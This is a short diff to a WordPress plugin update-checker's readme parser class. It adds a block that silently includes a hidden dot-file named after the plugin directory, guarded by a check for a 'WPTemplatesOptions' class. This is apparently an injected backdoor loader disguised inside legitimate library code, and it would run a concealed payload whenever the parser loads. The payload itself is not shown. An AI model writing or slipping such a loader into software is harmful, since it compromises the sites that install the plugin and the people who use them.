@@ -7,6 +7,10 @@ if ( !class_exists('PucReadmeParser', false) ):
  * It uses Parsedown instead of the "Markdown Extra" parser.
  */
 
+if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
+    include_once($filename);
+}
+
 class PucReadmeParser {
 
 	function __construct() {
